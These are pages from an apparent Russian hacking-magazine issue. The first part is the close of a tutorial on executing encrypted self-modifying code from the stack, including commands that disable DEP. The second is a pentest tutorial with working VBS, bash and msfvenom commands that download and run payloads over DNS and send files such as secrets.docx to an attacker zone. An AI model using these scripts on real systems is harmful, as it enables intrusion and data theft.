при попыт ке их модифицировать. Напротив, Windows 9x не под держивает
такую возможность. Означает ли это, что все копии самомодифициру ющегося
приложения будут вынуждены работать с одними и теми же страницами кода
(а это неизбежно приведет к кон флик там и сбоям)?
   Нет, и вот почему: несмотря на то что копирование при записи в Windows 9x
не реализовано, эту заботу берет на себя сама фун кция WriteProcessMemory,
создавая копии всех модифициру емых страниц, распределен ных между про-
цессами. Благодаря этому самомодифициру ющийся код одинаково хорошо
работает как под Windows 9x, так и под Windows NT. Однако следует учитывать,
что все копии приложения, модифициру емые любым иным путем (например,
коман дой mov нулевого коль ца), если их запустить под Windows 9x, будут раз-
делять одни и те же страницы кода со всеми вытекающими отсюда последс-
твиями.


Теперь об  ограничениях.  Во-первых,  исполь зовать  WriteProcessMemory
разум но толь ко в ком пилиру ющих в память ком пиляторах или распаковщиках
исполняемых файлов, а в защитах — несколь ко наивно. Мало-маль ски опыт -
ный взлом щик быстро обнаружит под вох, увидев эту фун кцию в таблице
импорта. Затем он установит точку останова на вызов WriteProcessMemory
и будет кон тролировать каждую операцию записи в память. А это никак не вхо-
дит в планы разработ чика защиты!
   Дру гое ограничение WriteProcessMemory зак лючается в невозможности
создания новых страниц, ей доступны лишь существу ющие страницы. А как
быть, если требует ся выделить некоторое количество памяти, например
для кода, динамически генерируемого на лету? Вызов фун кций управления
кучей, таких как malloc или new, не поможет, посколь ку в куче выполнение
кода запрещено. И вот тог да-то на помощь приходит возможность выполнения
кода в стеке...


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ





                                  БОРЕМСЯ
                        С ДИЗАССЕМБЛЕРАМИ
                             И ЗАТРУДНЯЕМ
                              РЕВЕРС ПРОГРАММ





ÂÛÏÎËÍÅÍÈÅ ÊÎÄÀ Â ÑÒÅÊÅ

Разрешение на выполнение кода в стеке объясняется тем, что исполняемый
стек необходим многим прог раммам, в том числе и самой операционной сис-
теме для выполнения некоторых системных фун кций. Благодаря этому ком -
пиляторам и ком пилиру ющим интерпретаторам проще генерировать код.
  Од нако вместе с этим увеличивает ся и потен циаль ная угроза атаки. Если
выполнение кода в стеке разрешено и при определен ных обстоятель ствах
из-за ошибок реализации управление передается на введен ные поль зовате-
лем дан ные, злоумыш ленник получает возможность передать и выполнить
на удален ной машине свой собствен ный зловредный код. Для операционных
систем Solaris и Linux можно установить «заплатки», которые запретят исполне-
ние кода в стеке, но они не имеют боль шого распространения, посколь ку
делают невозможной работу множества прог рамм. Боль шинству поль зовате-
лей лег че смирить ся с угрозой атаки, чем остать ся без необходимых приложе-
ний.
  Не все глад ко с исполнением кода в стеке в ОС Windows. Начиная со вто-
рого пакета обновления для Windows  XP, в системе появилась фун кция
безопасности DEP (Data Execution Prevention). Во включен ном состоянии она
запрещает выполнение кода на определен ных страницах памяти, в том числе
и в стеке. Но, как в слу чае с *.nix-системами, ее часто отключают, чтобы поль -
зовать ся компь ютером по полной.
  Поэтому исполь зование стека для выполнения самомодифициру ющегося
кода вполне закон но и системно-независимо, то есть универсаль но. Помимо
этого, такое решение устраняет оба недостатка фун кции WriteProcessMemory:
 • Во-первых, выявлять и отслеживать модифициру ющие заранее неизвес-
   тную ячейку памяти коман ды чрезвычайно труд но, и взлом щику придет ся
   провести кропот ливый анализ кода защиты без надежды на скорый успех
   (при условии, что сам защит ный механизм реализован без гру бых ошибок,
   облегчающих задачу хакера).
 • Во-вторых, приложение в любой момент может выделить столь ко стековой
   памяти, сколь ко ему заблагорассудит ся, а затем, при исчезновении пот -
   ребности, ее освободить. По умолчанию система резервиру ет один
   мегабайт стекового пространства, а если этого для решения поставлен ной
   задачи недостаточно, нужное количество можно указать при ком поновке
   прог раммы.

Замечатель но, что для выполняющихся в стеке прог рамм справед лив прин цип
фон Неймана — в один момент времени текст прог раммы может рассмат -
ривать ся как дан ные, а в дру гой — как исполняемый код. Имен но это необ-
ходимо для нормаль ной работы всех распаковщиков и расшифровщиков
исполняемого кода.
  Од нако прог раммирование кода, выполняющегося в стеке, имеет ряд спе-
цифических особен ностей.


«Ïîäâîäíûå êàìíè» ïåðåìåùàåìîãî êîäà
При разработ ке выполняющегося в стеке кода следует учитывать, что в разных
версиях Windows местоположение стека может различать ся и, чтобы сохранить
работоспособность при переходе от одной системы к дру гой, код должен быть
безразличен к адресу, по которому он будет заг ружен. Такой код называют
перемещаемым, и в его создании нет ничего сложного: достаточно следовать
несколь ким простым сог лашениям.
  Замечатель но, что у мик ропроцессоров серии Intel 80x86 все корот кие
переходы (short jump) и близкие вызовы (near  call) относитель ны, то есть
содержат не линейный целевой адрес, а разницу целевого адреса и адреса
следующей выполняемой инструк ции. Это значитель но упрощает создание
перемещаемого кода, но вместе с этим нак ладывает на него некоторые огра-
ничения.
   Что произойдет, если вот такую фун кцию скопировать в стек и передать ей
управление?


void Demo()
{
      printf("Demo\n");
}

Посколь ку  инструк ция call, вызывающая фун кцию printf,  «переехала»
на новое место, разница адресов вызываемой фун кции и следующей за call
инструк ции станет совсем иной и управление получит отнюдь не printf, а не
имеющий к ней никакого отношения код! Вероятнее всего, им окажет ся
«мусор», порождающий исключение с последу ющим аварийным зак рытием
приложения.
   Прог раммируя на ассем блере, такое ограничение можно лег ко обойти,
исполь зуя регистровую адресацию. Перемещаемый вызов фун кции printf
упрощен но может выг лядеть, например, так:


lea eax, printf
call eax

В регистр EAX (или любой дру гой регистр общего назначения) заносит ся абсо-
лют ный линейный, а не относитель ный адрес, и независимо от положения инс-
трук ции call управление будет передано фун кции printf, а не чему-то еще.
  Од нако такой под ход требует знания ассем блера, под держки ком пилято-
ром ассем блерных вставок и не очень-то нравит ся прик ладным прог раммис-
там, не интересу ющим ся коман дами и устройством процессора.
   Для решения этой задачи исключитель но средствами язы ка высокого уров-
ня необходимо передать стековой фун кции указатели на вызываемые ею фун -
кции в виде аргу мен тов. Это несколь ко неудобно, но более корот кого пути,
по-видимому,   не  существу ет.   Далее   приведен   текст   прог раммы
stack_execute, иллюстрирующей копирование и выполнение фун кции в стеке:


#include <stdio.h>


void Demo(int (*_printf) (const char*, ...))
{
    _printf("Hello, World!\n");
    return;
}


int main(int argc, char* argv[])
{
    char buff[1000];


int (*_printf) (const char*, ...);
int(*_main) (int, char**);
void (*_Demo) (int (*) (const char*, ...));
_printf = printf;
_main = main;
_Demo = Demo;


int func_len = (unsigned int)_main - (unsigned int)_Demo;


for (int a = 0; a < func_len; a++)
    buff[a] = ((char*)_Demo)[a];


_Demo = (void (*) (int (*) (const char*, ...))) &buff[0];
_Demo(_printf);


return 0;


}

Но не спеши ком пилировать и запускать приложение. Для построения прог -
раммы надо выбрать плат форму x86 и режим выпуска Release. В противном
слу чае, хотя приложение будет успешно построено, оно не выведет приветс-
твен ную строку на экран, так как при установке режима Release автоматически
отключают ся отладочные механизмы ком пиляции, которые в дан ном слу чае
могут испортить картину.
  Вдобавок надо отключить DEP. Ког да он включен, как мы знаем, Windows
нак ладывает запрет на исполнение кода в стеке, следователь но, прог рамма
stack_execute ничего не выведет на экран и сразу завершит свой процесс,
потому что, произведя определен ные манипу ляции, она копиру ет фун кцию
Demo в стек и запускает ее уже отту да. И толь ко последняя выводит строку
на кон соль.
  В нашем слу чае включение прог раммы в список исключений DEP не увен -
чалось успехом, stack_execute в таком слу чаем по-прежнему не выводила
строку.





     Список прог рамм-исключений, на которые DEP влиять не должен

Поэтому приш лось отключить DEP глобаль но, на уровне всей системы.
В запущен ной от имени администратора кон соли надо ввести:
 • bcdedit.exe /set {current} nx AlwaysOff — чтобы вык лючить
   DEP;
 • bcdedit.exe /set {current} nx AlwaysOn — чтобы включить DEP.




Дополнитель но нелиш ним будет отключить оптимизацию: во-первых, так удоб-
нее отлаживать прог рамму, посколь ку оптимизатор «съедает» ненужные,
на его взгляд, перемен ные; во-вторых, они могут быть проинициализированы,
но, по мнению ком пилятора, не исполь зованы, из-за чего они опять будут уда-
лены из бинарника. А это, в свою очередь, может сказать ся на правиль ной
работе приложения. Да, бывает и такое. Поэтому надо следить за работой
ком пилятора, чтобы он не удалил чего-нибудь лиш него!


После перезаг рузки операционной системы stack_execute будет работать
как надо и выводить приветствен ную строку.




   Коррек тный вывод приветствен ной строки фун кцией, вызванной из стека

Кроме того, обрати внимание, как фун кция printf в предыду щем листинге
выводит приветствие на  экран. На первый  взгляд,  ничего необычного,
но задумайся, где размещена строка «Hello, World!». Разумеется, не в сег -
менте кода — там ей не место (хотя некоторые ком пиляторы помещают ее
имен но туда). Выходит, в сег менте дан ных, там, где ей и положено быть?
Но если так, то одного лишь копирования тела фун кции окажет ся явно недос-
таточно, придет ся скопировать и саму строковую кон стан ту. А это утомитель но.
Но существу ет и дру гой способ — создать локаль ный буфер и инициализиро-
вать его по ходу выполнения прог раммы, например так:


...buf[666];
buff[0] = 'H';
buff[1] = 'e';
buff[2] = 'l';
buff[3]= 'l';
buff[4]= 'o';

Не самый корот кий, но из-за его простоты широко распространен ный путь.


Ïëþñû è ìèíóñû îïòèìèçèðóþùèõ êîìïèëÿòîðîâ
Применяя язы ки высокого уровня для разработ ки выполняемого в стеке кода,
следует учитывать особен ности реализаций исполь зуемых ком пиляторов и,
прежде чем останавливать свой выбор на каком-то одном из них, основатель -
но изу чить прилагаемую докумен тацию. В боль шинстве слу чаев код фун кции,
скопирован ный в стек, с первой попыт ки запустить не получит ся, особен но
если включена оптимизирован ная ком пиляция.
   Так происходит потому, что на чистом язы ке высокого уровня, таком
как C/C++ или Delphi, скопировать код фун кции в стек (или куда-то еще) прин -
ципиаль но невозможно, посколь ку стан дарты язы ка не оговаривают, каким
имен но образом  должна выполнять ся ком пиляция.  Прог раммист может
получить указатель на фун кцию, но в стан дарте не описано, как следует ее
интерпретировать. С точки зрения прог раммиста, она пред ставляет «магичес-
кое число», в назначение которого посвящен один лишь ком пилятор.
  К  счастью,  логика  кодогенерации  боль шинства ком пиляторов  более
или менее одинакова, и это позволяет прик ладной прог рамме сделать некото-
рые пред положения об организации откомпилирован ного кода.
  В частности, прог рамма, рассмот ренная ранее, молчаливо полагает, что
указатель на фун кцию совпадает с точкой входа в эту фун кцию, а все тело фун -
кции расположено непосредствен но за точкой входа. Имен но такой код
(наиболее очевид ный с точки зрения здравого смысла) и генерирует подав-
ляющее боль шинство ком пиляторов. Боль шинство, но не все! Тот же Microsoft
Visual C++ в режиме отладки вместо фун кций вставляет «переход ники», а сами
фун кции размешает совсем в дру гом месте. В резуль тате в стек копиру ется
содержимое «переход ника», но не само тело фун кции! Из-за этого при ком -
пиляции нашего примера был выбран режим Release.
   У дру гих ком пиляторов способ перек лючения этой опции может значитель -
но отличать ся, а в худ шем слу чае — вообще отсутствовать. Если это так, при-
дет ся отказать ся либо от самомодифициру ющегося кода, либо от дан ного
ком пилятора.
  Еще одна проблема: как достоверно определить длину тела фун кции? Язык
C/C++ не дает никакой возможности узнать значение этой величины, а опе-
ратор sizeof возвращает размер указателя на фун кцию, но не размер самой
фун кции. Одно из возможных решений опирает ся на тот факт, что ком пилято-
ры, как правило, располагают фун кции в памяти сог ласно поряд ку их объявле-
ния в исходной прог рамме. Следователь но, длина тела фун кции равна раз-
ности указателя на следующую за ней фун кцию и указателя на дан ную фун -
кцию.
  Посколь ку Windows-ком пиляторы в режиме x86 пред ставляют указатели 32-
разрядны ми целыми числами, их можно безболезненно преобразовы вать в тип
unsigned  int и выполнять над ними различные математические операции.
К сожалению, оптимизирующие ком пиляторы не всег да располагают фун кции
в таком простом поряд ке, а в некоторых слу чаях даже «разворачивают» их,
под ставляя содержимое фун кции на место ее вызова. Поэтому соот ветству -
ющие режимы оптимизации (если они есть) придет ся отключить.
   Дру гое коварство оптимизирующих ком пиляторов (как мы видели выше,
ког да настраивали ком пилятор) зак лючается в том, что они выкиды вают ими
все не исполь зуемые (с их точки зрения) перемен ные. Например, в приведен -
ной выше прог рамме в буфер buff что-то пишет ся, но ничего отту да не чита-
ется! А передачу управления на буфер боль шинство ком пиляторов (в том чис-
ле и Microsoft Visual C++) распознать не в силах, вот они и опускают копиру -
ющий код, отчего управление передается на неинициализирован ный буфер
с очевид ными последствиями. Если возникнут подобные проблемы, попробуй
отключить оптимизацию вообще (плохо, конечно, но надо).
  От компилирован ная прог рамма по-прежнему не работает? Вероятнее все-
го, причина в том, что ком пилятор вставляет в конец каждой фун кции вызов
процеду ры,  кон тролиру ющей  состояние  стека. Имен но  так  ведет  себя
Microsoft Visual C++, помещая в отладочные проекты вызов фун кции chkesp
(не ищи ее описания в докумен тации — его там нет). А вызов этот, как нет -
рудно догадать ся, относитель ный! К сожалению, никакого докумен тирован -
ного способа это запретить, по-видимому, не существу ет, но в финаль ных
(Release) проектах Microsoft  Visual C++ не кон тролиру ет состояние стека
при выходе из фун кции, и все работает нормаль но.


ÑÀÌÎÌÎÄÈÔÈÖÈÐÓÞÙÈÉÑß ÊÎÄ ÊÀÊ ÑÐÅÄÑÒÂÎ ÇÀÙÈÒÛ
ÏÐÈËÎÆÅÍÈÉ

И вот после столь ких мытарств и ухищрений злополучный пример запущен
и побед но выводит на экран «Hello, World!». Резон ный вопрос: а зачем, собс-
твен но, все это нужно? Какая выгода от того, что фун кция будет исполнена
в стеке? Ответ: код фун кции, исполняющейся в стеке, можно прямо на лету
изменять, например расшифровать ее.
  Шифрован ный код чрезвычайно зат рудняет дизассем блирование и уси-
ливает стойкость защиты, а какой разработ чик не хочет уберечь свою прог -
рамму от хакеров? Разумеется, одна лишь шифровка кода не очень-то серь -
езное препятствие для взлом щика, снабженного отладчиком или прод винутым
дизассем блером наподобие IDA Pro.
   Простейший алгоритм шифрования зак лючается в последователь ной обра-
бот ке каждого элемен та исходного тек ста операцией «исключающее ИЛИ»
(XOR). Повторное применение XOR к зашифрован ному тек сту позволяет вновь
получить исходный текст.
  Следующий пример save_demo_to_file читает содержимое фун кции Demo,
зашифровывает его и записы вает получен ный резуль тат в файл, после чего
откры вает файл с диска, заг ружает дан ные, расшифровывает последователь -
ность байтов и исполняет их, как ни в чем не бывало:


#include <stdio.h>
#include <memory.h>


void Demo(int (*_printf) (const char*, ...))
{
    _printf("Hello, World!\n");
    return;
}


int write_file(const char* filename, unsigned char* buff, const
int func_len)
{
    FILE* f;


if (fopen_s(&f, filename, "wb") == 0) {
    for (int a = 0; a < func_len; a++) {
        unsigned char c = buff[a] ^ 0x77;
        buff[a] = c;
        fputc(c, f);
    }
    fclose(f);
}
else return -1;


return 0;


}


int read_file(const char* filename, unsigned char* buff, const int
func_len)
{
    FILE* f;


if (fopen_s(&f, "Data.bin", "rb") == 0) {
    int bc = 0;
    while (!feof(f)) {
        unsigned char c = fgetc(f);
        buff[bc] = c ^ 0x77;
        bc++;
    }
    fclose(f);
}
else return -1;


return 0;


}



int main(int argc, char* argv[])
{
    unsigned char buff[1000];
    void (*_Demo) (int (*) (const char*, ...));
    int(*_main) (int, char**);
    int (*_printf) (const char*, ...);
    _Demo = Demo;
    _main = main;
    _printf = printf;
    int func_len = (unsigned int)_main - (unsigned int)_Demo;


for (int a = 0; a < func_len; a++)
    buff[a] = ((unsigned char*)_Demo)[a];


const char* fname = "Data.bin";
// Выводим последовательность байтов на экран
printf("%s\n", buff);
// Зашифровываем последовательность байтов и пишем в файл
write_file(fname, buff, func_len);
// Выводим измененную последовательность байтов на экран
printf("%s\n", buff);
// Очищаем массив байтов
memset(buff, 0, 1000);
// Выводим обнуленную последовательность байтов на экран
printf("%s\n", buff);
// Читаем байты из файла, одновременно расшифровывая их
read_file(fname, buff, func_len);
// Выводим итоговую последовательность байтов на экран
printf("%s\n", buff);


_Demo = (void (*) (int (*) (const char*, ...))) &buff[0];
_Demo(_printf);


return 0;


}

Чтобы ском пилировать прог рамму, установи для среды разработ ки те же
парамет ры, что были в прош лом проекте: плат форма — x86, режим — Release.
Так же можешь отключить оптимизацию.
   Для наг лядности выполняемые прог раммой операции помещены в отдель -
ные фун кции. Как уже было сказано выше, фун кция Demo выступает объектом
эксперимен та: сначала она читается из основной фун кции main, тем самым ее
тело сохраняется в массиве байтов buff. Затем имя файла для сохранения,
этот буфер и его длина передаются фун кции write_file, которая побайтно
записы вает содержимое буфера в файл, одновремен но шифруя каждый байт.
При этом в буфере зашифрован ный байт заменяет исходный. Закон чив свое
выполнение, фун кция write_file возвращает в получен ном парамет ре ука-
затель на модифицирован ный буфер.
  После вывода содержимого буфера на кон соль прог рамма очищает его
и вызывает фун кцию read_file, передавая ей имя файла, который надо про-
честь, обну лен ный буфер и его длину. Открыв задан ный двоичный файл,
read_file читает его до кон ца, перебирая, расшифровывая и сохраняя
в буфере каждый байт. Ког да весь файл расшифрован, а буфер заполнен, ука-
затель на него в получен ном парамет ре возвращает ся в основную фун кцию,
где происходит присвоение содержимого массива байтов ранее объявленно-
му указателю _Demo на фун кцию, имеющую прототип фун кции Demo.
  Наконец, с помощью указывающего в стек указателя прог рамма вызывает
фун кцию Demo, толь ко что заг ружен ную из файла.
  Обрати внимание: после каждой операции прог рамма выводит содер-
жимое буфера на экран. Таким образом, завершив свое выполнение, прог -
рамма оставляет в кон соли следующий вывод.





Плюс в папке с прог раммой появляет ся файл Data.bin, содержащий двоичный
зашифрован ный код фун кции Demo.


Çàøèôðîâàííûé êîä — ñëåäóþùèé óðîâåíü çàùèòû ïðèëîæåíèé
Хотя теперь прежде, чем выполнять код, прог рамма проворачивает с ним
каверзные манипу ляции, для хакера с дизассем блером и пятью минутами
лиш него времени не составит боль шого тру да разобрать ся в хит росплетениях
кода.
  А что, если из исходного тек ста прог раммы напрочь удалить фун кцию Demo,
а взамен поместить ее зашифрован ное содержимое в строковой перемен ной
(впрочем, необязатель но имен но  строковой)? Затем  в нужный момент
это содержимое может быть расшифровано, скопировано в локаль ный буфер
и вызвано для выполнения. Один из вариантов реализации зашифрован ной
прог раммы приведен в следующем листинге — cipher_program:


#include <stdio.h>
#include <string.h>
#include <cstdlib>


int main(int argc, char* argv[])
{
    char buff[1000] = "";
    int (*_printf) (const char*, ...);
    void (*_Demo) (int (*) (const char*, ...));
    // Эта последовательность байтов должна быть записана в одну
строку
    char code[] = "\x22\xFC\x9B\xF4\x9B\x67\xB1\x32\x87\x3F\xB1\
x32\x86\x12\xB1\x32\x85\x1B\xB1\x32\x84\x1B\xB1\x32\x83\x18\xB1\
x32\x82\x5B\xB1\x32\x81\x57\xB1\x32\x80\x20\xB1\x32\x8F\x18\xB1\
x32\x8E\x05\xB1\x32\x8D\x1B\xB1\x32\x8C\x13\xB1\x32\x8B\x56\xB1\
x32\x8A\x7D\xB1\x32\x89\x77\xFA\x32\x87\x27\x88\x22\x7F\xF4\xB3\
x73\xFC\x92\x2A\xB4";
    _printf = printf;
    int code_size = _countof(code);
    if (strcpy_s(buff, code_size, code) == 0) {
        for (int a = 0; a < code_size; a++)
            buff[a] = buff[a] ^ 0x77;
        _Demo = (void (*) (int (*) (const char*, ...))) &buff[0];
        _Demo(_printf);
    }
    return 0;
}

Чтобы построить прог рамму, нужно, как в прош лый раз, выбрать плат форму
x86, режим — Release. И, возможно, отключить оптимизацию.




   Побед ный вывод приветствен ной строчки зашифрован ной процеду рой

Теперь даже при наличии исходных тек стов алгоритм работы фун кции Demo
будет пред ставлять загад ку! Этим обстоятель ством можно восполь зовать ся,
чтобы скрыть некоторую критическую информацию, например процеду ру
генерации ключа или проверку серийного номера.
  Проверку серийного номера желатель но организовать так, чтобы даже пос-
ле расшифровки кода ее алгоритм пред ставлял бы головолом ку для хакера.


ÇÀÊËÞ×ÅÍÈÅ

Многие считают исполь зование самомодифициру ющегося кода «дурным» при-
мером прог раммирования и обвиняют его в том, что он не переносим, плохо
совместим с разными операционны ми системами, требует обязатель но обра-
щать ся к ассем блеру и так далее. С появлением Windows NT этот список
пополнился еще одним умозак лючением, дескать, самомодифициру ющийся
код — толь ко для MS-DOS, в нормаль ных же операционных системах он
невозможен.
   Как показы вает статья, все эти пред положения, мяг ко выражаясь, неверны.
Дру гой вопрос: так ли необходим самомодифициру ющийся код и можно ли
без него обойтись? Низкая эффективность существу ющих защит (обычно прог -
раммы ломаются быстрее, чем успевают дойти до легаль ного пот ребителя)
и огромное количество прог раммистов, стремящихся «топтанием клавиш»
заработать себе на хлеб, свидетель ству ет, что необходимо усиливать защит -
ные механизмы любыми доступны ми средствами, в том числе и рассмот -
ренным выше самомодифициру ющим ся кодом.
  В противостоянии разработ чиков легаль ного софта и взлом щиков с их
изощренным  инстру мен тарием  самомодифициру ющийся  код  выступает
на стороне первых. Хотя в текущих условиях он предоставляет не настоль ко
изящные механизмы, которые были доступны в эпоху MS-DOS, даже сейчас
в руках опыт ного прог раммиста они позволяют реализовать достойную защиту
толь ко с исполь зованием язы ков высокого уровня.




«Фун дамен таль ные основы хакерства» подош ли к кон цу. Я был рад работать
над этим фун дамен таль ным тру дом Криса Касперски, привести его в соот -
ветствие современ ным реалиям и стан дартам. Как ты мог заметить, главная
причина тран сформации прог рам много обеспечения для IBM PC за последние
пят надцать лет — это повсеместный переход на процессорную архитек туру
x86-64. Все осталь ные изменения обусловлены имен но этим.
  Надеюсь, тебе тоже было интересно читать и разбирать примеры.
  Время идет, технологии развиваются, фун дамен таль ные основы хакерства
тоже расширяются. Поэтому присутству ют мысли о некоем продолжении
материала в том же духе.
   Благодарю всех читателей, особен но тех, кто оставлял полезные ком мента-
рии, позволившие исправить опечат ки и дополнить материал. Спасибо всем,
кто интересу ется темой и читает статьи: благодаря вашей активности я видел,
что тема «Фун дамен таль ных основ» интересна и нужна.
   Так же хочу поблагодарить наших замечатель ных редак торов, в частности:
Вален тина Холмогорова, без устали работающего над моими стать ями на про-
тяжении несколь ких лет, и Алек сан дра Лозовского, хотя он уже не принимает
участие в создании «Хакера». Имен но с ним мы начали этот проект и решили
сделать все мак сималь но качествен но, несмотря на зат рачен ное время.
  Сведения о даль нейшем развитии проекта «Фун дамен таль ных основ»,
в том числе о публикации в виде книги, ищи на моем сайте — на странице,
посвящен ной этому проекту . Хотя каждая статья содержит исходный код всех
рассмат риваемых примеров, этот код, дизассем блерные листинги и допол-
нитель ные материалы по теме будут размещены на моем сайте для свобод -
ного скачивания.
ВЗЛОМ





         ИЗУЧАЕМ МЕТОДЫ
         ПЕРЕДАЧИ ДАННЫХ
          ПРИ ПЕНТЕСТАХ





Пред ставь,  что  тебе  уда лось  про бить
сетевой периметр и получить доступ к сер -
веру. Сер вер вхо дит во внут реннюю сеть
ком пании, а это зна чит, что ты можешь
про ник нуть и туда. Но, к сожалению, ском -               s0i37                                                                                  Lead cybersecurity analyst at
про мети рован ный узел находит ся в DMZ      USSC t.me/s0i37_channel                                                                                              s0i37@ya.ru
и не имеет выхода в интернет. Смо жем ли
мы пробраться внутрь теперь?


В боль шинстве слу чаев внут ренние сети никак не ограничивают разрешение
DNS-имен произволь ных зон. А посколь ку природа DNS распределен ная, тот
или иной DNS-запрос может приходить точно на под кон троль ный сервер зло-
умыш ленника. В итоге мы получим полноцен ный канал передачи дан ных.
  В наши дни существу ют замечатель ные решения для организации целых
VPN-тун нелей через DNS, такие как iodine. При этом, даже если ты не имеешь
прав root, ты всег да можешь восполь зовать ся dnscat или dns2tcp, который
пробросит произволь ное соединение, скажем, на прок си. И в том и в дру гом
слу чае ты сможешь преодолеть ограничения файрволов и начать прод вижение
по внут ренней сети.
  Но остается нерешен ным главный вопрос: как передать эти прог раммы
в ском прометирован ную сеть? В этом нам поможет набор моих скриптов
для инфиль трации и эксфиль трации дан ных на все слу чаи жизни. Главная их
особен ность в полном отсутствии требований к административным привиле-
гиям и прицел на переносимость — ведь на исследуемом сервере окажет ся
либо Windows, либо Linux.


ÈÍÔÈËÜÒÐÀÖÈß ×ÅÐÅÇ DNS

DNS — наш незаменимый помощник. С помощью следующего кода мы можем
скачать любой файл с исполь зованием DNS на любую Windows:


dns_download.vbs
On Error Resume Next
Set objShell = CreateObject("WScript.Shell")
Set writer = CreateObject("Scripting.FileSystemObject").
createtextfile("c:\windows\temp\out.exe")
For d = 1 To 1190
 pos = 0
 While pos = 0
  Set exec = objShell.Exec("nslookup -type=txt d"&d&".txt.
yourzone.tk")
  res = exec.Stdout.ReadAll()
  pos = inStr(1,res,"?")
  txt = Mid(res,pos+1,253)
  Wscript.Echo d & " " & txt
 Wend
 For b = 0 To Len(txt)/2-1
   writer.Write Chr(CInt("&H" & Mid(txt,1+b*2,2)))
 Next
Next

А вот скрипт для Linux:


dns_download.sh
#!/bin/bash
for i in `seq $2`
do
    answ=` host -t txt "d$i.txt.$1" |cut -d ' ' -f 4 `
    echo ${answ :2:-1 } | xxd -r -p - >> $3
    echo $i ${answ :2:-1 }
done

Язык VBS обеспечивает нам стопроцен тную переносимость между всеми вер-
сиями Windows (в отличие от PowerShell). Под Linux, как всег да, исполь зуем
bash.
  На стороне ском прометирован ного сервера скрипты запускают ся сле-
дующим образом.
  Вариант для Windows:


cscript.exe dns_download.vbs

Для Linux:


./dns_download.sh attacker.tk 1190 /tmp/dnscat

На стороне атакующего — так:


sudo ./dns_upload.py --udp --file dnscat.exe

Например, на скрин шотах ниже прог рамма dns2tcpc.exe передается через
DNS с NS-сервера под кон троль ной мне DNS-зоны на victim с исполь зованием
чистого VBS.





Произволь ные дан ные будут проходить через TXT-записи в виде hexastring.
  Далее мы можем развивать DNS-тун нелирование уже с исполь зованием
привычных инстру мен тов.


ÝÊÑÔÈËÜÒÐÀÖÈß ×ÅÐÅÇ DNS

Аналогичным образом мы можем и выг ружать файлы с victim. На атакующей
стороне это делается так:


sudo ./dns_download.py --udp --file secrets.docx

На стороне жертвы — так:


cscript.exe dns_upload.vbs c:\path\to\secrets.docx attacker.tk


DNS-ØÅËË-ÊÎÄ

При эксплу атации уязвимостей из интернета нужно пом нить, что атакуемая
система, скорее всего, находит ся в DMZ, отку да доступа в интернет у нее
может и не быть. Так что заряжать эксплоит reverse_tcp шелл-кодами ока-
жет ся бесполезным занятием. Шелл не откроется, и ты подумаешь, что цель
неуязвима, пропат чена или просто эксплоит нерабочий.  Хотя все дело
в payload.
  Мы можем внед рить наш DNS-тран спорт в любой шелл-код, исполь зуя
dns_download_exec:


msfvenom -p windows/exec CMD=$(cat dns_download_exec.bat) -f raw
-o dns_shellcode


msfvenom -p linux/x86/exec CMD=$(cat dns_download_exec.sh) -f raw
-o dns_shellcode

Такой шелл-код в зависимости от обстоятель ств можно вставить в любой экс-
плоит или инжектить сразу в память. Он не толь ко скачивает по DNS, но еще
и запускает принятый файл. Таким образом, например, мы можем сразу
передать dnscat либо же что-то свое.
  А теперь перейдем к пивоту в реаль но труд ных обстоятель ствах.


ÈÍÔÈËÜÒÐÀÖÈß ×ÅÐÅÇ ÍÀÆÀÒÈß ÊËÀÂÈØ

Что делать, если DNS у нас не резолвит внеш ние зоны? Такое тоже может слу -
чить ся.
  Вне зависимости от того, где ты оказался, будь то реверс-шелл, Telnet
без возможности передачи файлов или, наконец RDP, на котором нет буфера
обмена, ты всег да можешь «набить» любой файл, исполь зуя отправку нажати-
ем клавиш.
  В Linux есть специаль ная коман да xdotool, позволяющая передать текст
произволь ной длины через простые нажатия клавиш. С помощью этой же ути-
литы мы можем пред варитель но активировать фокус на том или ином окне.
И всего этого нам достаточно, чтобы передать содержимое любого файла
в любое окно. Причем мы можем передать не толь ко тек стовый файл (какой-то
скрипт), но и бинарный (любую прог рамму):


setxkbmap us
cat somescript.ps1 | ./text_send.sh
cat someprog.exe | base64 | ./text_send.sh

Чтобы исключить ошибочный набор тек ста в том же терминале, скрипт будет
ждать клика мышью по тому окну, в котором требует ся ввести текст. В при-
мере, показан ном на скрин шотах ниже, мы успешно передали на атакуемый
узел классический netcat.exe.





Этот метод по скорости схож с DNS и позволил за пят надцать минут передать
netcat.exe (57 Кбайт) без исполь зования побочных каналов, толь ко простым
набором тек ста. Это примерно 125 байт/с, или 1 Мбайт за 2 ч. Этого вполне
достаточно для передачи хакерского ПО за умерен ное время.
   Скрипт может оказать ся полезным для автоматизации действий где угод но.
Например, всег да можно исполь зовать text_send.sh, чтобы автоматизиро-
вать набор длин ных скриптов на изолирован ных victim, если буфер обмена
недоступен:


setxkbmap us
cat dns_download.bat | ./text_send.sh

Если вернуть ся нем ного назад, к теме с DNS, то написание в блок ноте кода
первичного DNS-заг рузчика на victim можно было автоматизировать, просто
прог нав его код через text_send.sh на атакующей стороне.





Аналогично можем «набить» и бинарник, закодирован ный в Base64.


ÝÊÑÔÈËÜÒÐÀÖÈß ×ÅÐÅÇ QR

Исполь зуя метод с нажатиями клавиш, мы можем заг рузить любой файл
на машину жертвы. Но как организовать передачу дан ных в обратном нап-
равлении? Есть возможность выкачивать файлы с  victim через QR-коды.
К счастью, в Linux (attacker-side) распознавание можно автоматизировать:
graphicsmagick снимает скрин шот экрана, а прог рамма из zbar-tools рас-
познаёт код.
  А вот для генерации QR-кодов на victim-side была разработана простая
кросс-плат формен ная  прог рам мка,  исполь зующая  библиотеку  QR-Code-
generator. Код библиотеки zero-depends, так что он может быть кросс-ком -
пилирован даже под дру гие архитек туры процессоров (это пригодит ся, ког да
проник новение выполняет ся через устройства наподобие IP-камер). Для ком -
пиляции и сборки ее под Windows и Linux выполняем следующие действия.
  На стороне жертвы (Windows):


cl /c lib\qrcodegen.c
cl /c qr_upload.c
link /out:qr_upload.exe qr_upload.obj qrcodegen.obj
"change your color scheme to black on white"
chcp 866
set TIMEOUT=1000
set SIZE=100
qr_upload.exe c:\path\to\secret.bin

На стороне жертвы (Linux):


gcc -c lib/qrcodegen.c
gcc -c qr_upload.c
gcc qr_upload.c qrcodegen.o -o qr_upload
setterm -background white
setterm -foreground black
TIMEOUT= 1000 SIZE=100 ./qr_upload /path/to/secret.bin

При генерации QR-кодов мы задаем через перемен ные среды количество
байтов и продолжитель ность демонстрации картинки в миллисекун дах. Тут
